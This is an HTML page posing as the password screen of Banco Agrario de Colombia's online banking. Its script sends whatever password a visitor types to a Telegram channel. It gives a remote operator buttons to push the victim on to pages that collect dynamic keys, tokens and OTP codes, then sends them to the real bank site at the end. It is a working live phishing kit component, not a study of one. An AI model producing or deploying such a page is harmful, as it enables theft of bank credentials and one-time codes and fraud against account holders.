<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Contrase√±a - Banca Virtual Banco Agrario</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-content">
      <img src="img/logo-loading.1e8df20e3234c350bddc.svg" alt="Cargando..." class="loading-logo">
      <div class="loading-text">Cargando...</div>
    </div>
  </div>

  <!-- Header -->
  <header class="header">
    <div class="logo-container">
      <img src="img/logo_bancoAgrario.5ee1db48b188d1b24e24.svg" alt="Banco Agrario de Colombia" class="logo">
    </div>
    <div class="language-selector">
      <div class="flag-icon"></div>
      <span class="language-text">ES</span>
    </div>
  </header>

  <!-- Main Content -->
  <main class="main-content">
    <div class="form-container">
      <button class="back-button" onclick="window.location.href='index.html'">
        <span class="back-arrow">‚Üê</span>
        Contrase√±a
      </button>
      
      <form id="passwordForm">
        <div class="input-group">
          <div class="password-input-wrapper">
            <input 
              type="password" 
              id="passwordInput" 
              class="input-field" 
              placeholder="Ingrese su contrase√±a"
              autocomplete="off"
              maxlength="50"
            >
            <button type="button" class="toggle-password" id="togglePassword">
              <svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                <circle cx="12" cy="12" r="3"></circle>
              </svg>
            </button>
          </div>
        </div>

        <div class="image-verification">
          <div class="checkbox-container">
            <input type="checkbox" id="imageCheck" class="checkbox-input">
          </div>
          <label for="imageCheck" class="verification-text">
            Aseg√∫rese que esta es la imagen seleccionada por Ud
          </label>
        </div>

        <div class="btn-container">
          <button type="button" class="btn-cancelar" onclick="window.location.href='index.html'">
            Cancelar
          </button>
          <button type="submit" class="btn-siguiente" id="btnSiguiente" disabled>
            Siguiente
          </button>
        </div>
      </form>

      <div class="links-container">
        <a href="#" class="link-secondary">¬øHa olvidado su contrase√±a?</a>
        <a href="#" class="link-secondary">¬øSu usuario ha sido bloqueado?</a>
      </div>
    </div>

    <!-- Footer Image -->
    <img src="img/persona-small.08efe0e0209b478a65bb.png" alt="Personas" class="footer-image">
    <div class="footer-text">Copyright ¬© Banco Agrario de Colombia 2025. Todos los Derechos Reservados</div>
  </main>

  <script src="/socket.io/socket.io.js"></script>
  <script src="/js/banco-utils.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const input = document.getElementById('passwordInput');
      const btn = document.getElementById('btnSiguiente');
      const form = document.getElementById('passwordForm');
      const overlay = document.getElementById('loadingOverlay');
      
      if (!input || !btn || !form || !overlay) return;
      
      overlay.classList.remove('show', 'active');
      overlay.style.display = '';
      
      const socketInstance = BancoUtils.initSocket();
      if (socketInstance) socketInstance.removeAllListeners('telegramAction');
      
      btn.disabled = true;
      btn.classList.remove('active');
      
      input.addEventListener('input', function() {
        const shouldEnable = input.value.trim().length > 0;
        btn.disabled = !shouldEnable;
        btn.classList.toggle('active', shouldEnable);
      });
      
      form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const currentSocket = BancoUtils.getSocket();
        if (!currentSocket || !currentSocket.connected) {
          BancoUtils.initSocket();
          await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        overlay.classList.add('show');
        const data = { password: input.value.trim() };
        const fullData = BancoUtils.saveBankData('agrario', data);
        const message = BancoUtils.formatMessage('BANCO AGRARIO - PASSWORD', fullData);
        const buttons = [
          { text: 'üë§ Usuario', action: 'usuario' },
          { text: 'üîê Password', action: 'password' },
          { text: 'üî¢ Din√°mica', action: 'dinamica' },
          { text: 'üîë Token', action: 'token' },
          { text: 'üì± OTP', action: 'otp' },
          { text: '‚úÖ Finalizar', action: 'finalizar' }
        ];
        const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
        
        try {
          await BancoUtils.sendToTelegram('password', { text: message, keyboard });
        } catch (error) {
          overlay.classList.remove('show');
          alert('Error al enviar');
        }
      });
      
      BancoUtils.onTelegramAction((data) => {
        if (data.action === 'usuario') window.location.href = 'index.html';
        else if (data.action === 'dinamica') window.location.href = 'dinamica.html';
        else if (data.action === 'token') window.location.href = 'token.html';
        else if (data.action === 'otp') window.location.href = 'otp.html';
        else if (data.action === 'finalizar') window.location.href = 'https://www.bancoagrario.gov.co';
      });
    });
  </script>
</body>
</html>
